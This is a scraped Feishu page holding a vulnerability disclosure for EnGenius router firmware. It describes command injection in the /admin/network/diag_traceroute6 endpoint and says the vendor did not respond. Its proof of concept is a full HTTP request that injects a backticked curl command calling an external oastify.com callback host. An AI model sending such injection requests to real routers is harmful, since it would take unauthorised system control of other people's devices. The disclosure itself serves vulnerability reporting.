=== Content from k9u7kv33ub.feishu.cn_d151ca81_20250114_202150.html ===
         ShareCommand Injection In diag\_traceroute6 interface Of ENGENIUS Router  Type '/' for commands
# Command Injection In diag\_traceroute6 interface Of ENGENIUS Router​

![](https://s3-imfile.feishucdn.com/static-resource/v1/e6f5a9e2-91f0-4b42-9c06-c702a7925879~?image_size=72x72&cut_type=default-face&quality=&format=jpeg&sticker_format=.webp)Feishu user 1258Modified November 18, 2024BUG\_Author: i3eg1nner​Vendor: [engenius]([https://www.engeniustech.com](https://www.engeniustech.com/wp_firmware/))​Firmware: [Firmware download page](<https://www.engeniustech.com/wp_firmware/>)​Affected Version:​The latest version firmware of all routing devices and all previous versions, specific version information is as follows.​ENH1350EXT-3.5​ENS500-AC-v3.7.20​ens620ext-all-v3.9.1.7​Description:​Engenius full range of routing devices /admin/network/diag\_traceroute6 interface has a command injection vulnerability, after the user logs in to the device, the diag\_traceroute6 parameter command injection, the final system can successfully execute the command, can directly obtain system permissions.​Proof of Concept:​After the firmware is decrypted, it needs to reverse compile the lua bytecode and then analyze it. The core code of the vulnerability in the lua file is shown in the following figure.​![common.docs_name - LarkCCM_Docs_Menu_Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/v2/cover/M6LabiIj6oNDL3xScAmcytxRnsb/?fallback_source=1&height=1280&mount_node_token=EHkudBOIFok1GRxRTX1ctdoJndc&mount_point=docx_image&policy=equal&width=1280)Get the value of the user's input diag\_traceroute6, unfiltered, directly as a parameter to the diag\_command, causing the command to execute.​​BashGET /cgi-bin/luci/;stok=9c55fefcec063398bb47ceb1227ba1bd/admin/network/diag\_traceroute6/`curl%20yy03i77ylld04xa6y9gyz5mch3nubl59u.oastify.com`?\_=0.6914512959229704 HTTP/1.1​Host: IP​Cookie: sysauth=752f97ec4e36353acdb776dcfd573fdc​Sec-Ch-Ua: "Google Chrome";v="112", "Chromium";v="112", "Not=A?Brand";v="24"​Sec-Ch-Ua-Mobile: ?1​User-Agent: Mozilla/5.0 (Linux; Android 13; SM-A037U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 uacq​Sec-Ch-Ua-Platform: "Android"​Accept: \*/\*​Sec-Fetch-Site: same-origin​Sec-Fetch-Mode: cors​Sec-Fetch-Dest: empty​Accept-Encoding: gzip, deflate, br​Accept-Language: en-GB,en;q=0.9,en-US;q=0.8​Priority: u=1, i​Connection: close​![common.docs_name - LarkCCM_Docs_Menu_Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/v2/cover/QsbDbpMF0o7LmyxxgcLcCiBnnsf/?fallback_source=1&height=1280&mount_node_token=SYnwdM5daobpbOxkaqAcsguJnpg&mount_point=docx_image&policy=equal&width=1280)We tried to contact the ENGENIUS manufacturer, but there was no response.​de\_lua\_out.zip219.28KB
